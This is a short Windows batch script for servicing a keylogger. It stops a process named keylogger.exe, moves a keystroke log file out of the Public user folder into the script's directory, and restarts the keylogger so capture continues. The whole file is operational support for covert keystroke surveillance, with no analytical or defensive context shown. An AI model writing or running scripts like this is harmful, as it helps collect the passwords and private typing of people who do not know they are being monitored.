@echo off

taskkill /im keylogger.exe /f 2>nul

set SOURCE=C:\Users\Public\keylogs.txt
set DEST=%~dp0

move "%SOURCE%" "%DEST%"

echo Log retrieved.

REM Start the program again
start "" "C:\Users\Public\keylogger.exe"

echo Again started keylogger.exe

pause